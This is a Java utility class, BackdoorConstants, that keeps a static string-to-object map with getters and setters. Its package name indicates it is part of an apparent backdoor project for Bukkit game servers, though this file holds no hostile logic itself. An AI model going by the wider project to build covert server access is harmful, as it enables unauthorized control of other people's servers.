package com.balugaq.bukkitbackdoor.code;

import lombok.Getter;
import lombok.experimental.UtilityClass;

import java.util.HashMap;
import java.util.Map;
import java.util.Set;

@Getter
@UtilityClass
public class BackdoorConstants {
    private static final Map<String, Object> mapping = new HashMap<>();
    public static Object getObject(String key) {
        return mapping.get(key);
    }

    public static void setObject(String key, Object value) {
        mapping.put(key, value);
    }

    public static Map<String, Object> getMapping() {
        return mapping;
    }

    public static Set<String> keys() {
        return mapping.keySet();
    }
}
